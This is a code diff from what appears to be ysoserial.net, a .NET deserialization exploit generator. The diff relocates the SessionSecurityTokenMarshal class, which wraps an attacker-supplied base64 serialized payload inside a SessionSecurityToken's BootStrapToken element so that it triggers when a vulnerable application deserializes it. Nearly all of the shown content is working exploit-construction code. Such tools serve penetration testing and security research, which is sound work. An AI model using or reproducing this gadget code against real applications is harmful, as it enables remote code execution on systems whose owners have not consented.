@@ -38,82 +38,6 @@ namespace ysoserial.Generators
             return new List<string> { GadgetTypes.BridgeAndDerived };
         }
 
-        [Serializable]
-        public class SessionSecurityTokenMarshal : ISerializable
-        {
-            public SessionSecurityTokenMarshal(string b64payload)
-            {
-                B64Payload = b64payload;
-            }
-
-            private string B64Payload { get; }
-
-            public void GetObjectData(SerializationInfo info, StreamingContext context)
-            {
-                info.SetType(typeof(SessionSecurityToken));
-                MemoryStream stream = new MemoryStream();
-
-                using (XmlDictionaryWriter xmlDictionaryWriter = XmlDictionaryWriter.CreateBinaryWriter(stream, null, null))
-                {
-                    xmlDictionaryWriter.WriteStartElement("SecurityContextToken", "");
-
-                        xmlDictionaryWriter.WriteStartElement("Version", "");
-                            xmlDictionaryWriter.WriteValue("1");
-                        xmlDictionaryWriter.WriteEndElement();
-
-                        xmlDictionaryWriter.WriteElementString("SecureConversationVersion", "", (new Uri("http://schemas.xmlsoap.org/ws/2005/02/sc")).AbsoluteUri);
-
-                        xmlDictionaryWriter.WriteElementString("Id", "", "1");
-
-                        WriteElementStringAsUniqueId(xmlDictionaryWriter, "ContextId", "", "1");
-
-                        xmlDictionaryWriter.WriteStartElement("Key", "");
-                            xmlDictionaryWriter.WriteBase64(new byte[] { 0x01 }, 0, 1);
-                        xmlDictionaryWriter.WriteEndElement();
-
-                        WriteElementContentAsInt64(xmlDictionaryWriter, "EffectiveTime", "", 1);
-                        WriteElementContentAsInt64(xmlDictionaryWriter, "ExpiryTime", "", 1);
-                        WriteElementContentAsInt64(xmlDictionaryWriter, "KeyEffectiveTime", "", 1);
-                        WriteElementContentAsInt64(xmlDictionaryWriter, "KeyExpiryTime", "", 1);
-
-                        xmlDictionaryWriter.WriteStartElement("ClaimsPrincipal", "");
-                            xmlDictionaryWriter.WriteStartElement("Identities", "");
-                                xmlDictionaryWriter.WriteStartElement("Identity", "");
-                                    xmlDictionaryWriter.WriteStartElement("BootStrapToken", "");
-                                        xmlDictionaryWriter.WriteValue(B64Payload); // This is where the payload is
-                                    xmlDictionaryWriter.WriteEndElement();
-                                xmlDictionaryWriter.WriteEndElement();
-                            xmlDictionaryWriter.WriteEndElement();
-                        xmlDictionaryWriter.WriteEndElement();
-
-                    xmlDictionaryWriter.WriteEndElement();
-                    xmlDictionaryWriter.Flush();
-
-                    stream.Position = 0;
-
-                    //Console.WriteLine(Encoding.ASCII.GetString(stream.ToArray()));
-
-                    info.AddValue("SessionToken", stream.ToArray());
-
-                }
-            }
-
-            private void WriteElementContentAsInt64(XmlDictionaryWriter writer, String localName, String ns, long value)
-            {
-                writer.WriteStartElement(localName, ns);
-                writer.WriteValue(value);
-                writer.WriteEndElement();
-            }
-
-            private void WriteElementStringAsUniqueId(XmlDictionaryWriter writer, String localName, String ns, string id)
-            {
-                writer.WriteStartElement(localName, ns);
-                writer.WriteValue(id);
-                writer.WriteEndElement();
-            }
-
-        }
-
         private string GetB64SessionToken(string b64encoded)
         {
             var obj = new SessionSecurityTokenMarshal(b64encoded);
@@ -246,5 +170,81 @@ namespace ysoserial.Generators
                 throw new Exception("Formatter not supported");
             }
         }
+    }
+
+    [Serializable]
+    public class SessionSecurityTokenMarshal : ISerializable
+    {
+        public SessionSecurityTokenMarshal(string b64payload)
+        {
+            B64Payload = b64payload;
+        }
+
+        private string B64Payload { get; }
+
+        public void GetObjectData(SerializationInfo info, StreamingContext context)
+        {
+            info.SetType(typeof(SessionSecurityToken));
+            MemoryStream stream = new MemoryStream();
+
+            using (XmlDictionaryWriter xmlDictionaryWriter = XmlDictionaryWriter.CreateBinaryWriter(stream, null, null))
+            {
+                xmlDictionaryWriter.WriteStartElement("SecurityContextToken", "");
+
+                xmlDictionaryWriter.WriteStartElement("Version", "");
+                xmlDictionaryWriter.WriteValue("1");
+                xmlDictionaryWriter.WriteEndElement();
+
+                xmlDictionaryWriter.WriteElementString("SecureConversationVersion", "", (new Uri("http://schemas.xmlsoap.org/ws/2005/02/sc")).AbsoluteUri);
+
+                xmlDictionaryWriter.WriteElementString("Id", "", "1");
+
+                WriteElementStringAsUniqueId(xmlDictionaryWriter, "ContextId", "", "1");
+
+                xmlDictionaryWriter.WriteStartElement("Key", "");
+                xmlDictionaryWriter.WriteBase64(new byte[] { 0x01 }, 0, 1);
+                xmlDictionaryWriter.WriteEndElement();
+
+                WriteElementContentAsInt64(xmlDictionaryWriter, "EffectiveTime", "", 1);
+                WriteElementContentAsInt64(xmlDictionaryWriter, "ExpiryTime", "", 1);
+                WriteElementContentAsInt64(xmlDictionaryWriter, "KeyEffectiveTime", "", 1);
+                WriteElementContentAsInt64(xmlDictionaryWriter, "KeyExpiryTime", "", 1);
+
+                xmlDictionaryWriter.WriteStartElement("ClaimsPrincipal", "");
+                xmlDictionaryWriter.WriteStartElement("Identities", "");
+                xmlDictionaryWriter.WriteStartElement("Identity", "");
+                xmlDictionaryWriter.WriteStartElement("BootStrapToken", "");
+                xmlDictionaryWriter.WriteValue(B64Payload); // This is where the payload is
+                xmlDictionaryWriter.WriteEndElement();
+                xmlDictionaryWriter.WriteEndElement();
+                xmlDictionaryWriter.WriteEndElement();
+                xmlDictionaryWriter.WriteEndElement();
+
+                xmlDictionaryWriter.WriteEndElement();
+                xmlDictionaryWriter.Flush();
+
+                stream.Position = 0;
+
+                //Console.WriteLine(Encoding.ASCII.GetString(stream.ToArray()));
+
+                info.AddValue("SessionToken", stream.ToArray());
+
+            }
+        }
+
+        private void WriteElementContentAsInt64(XmlDictionaryWriter writer, String localName, String ns, long value)
+        {
+            writer.WriteStartElement(localName, ns);
+            writer.WriteValue(value);
+            writer.WriteEndElement();
+        }
+
+        private void WriteElementStringAsUniqueId(XmlDictionaryWriter writer, String localName, String ns, string id)
+        {
+            writer.WriteStartElement(localName, ns);
+            writer.WriteValue(id);
+            writer.WriteEndElement();
+        }
+
     }
 }
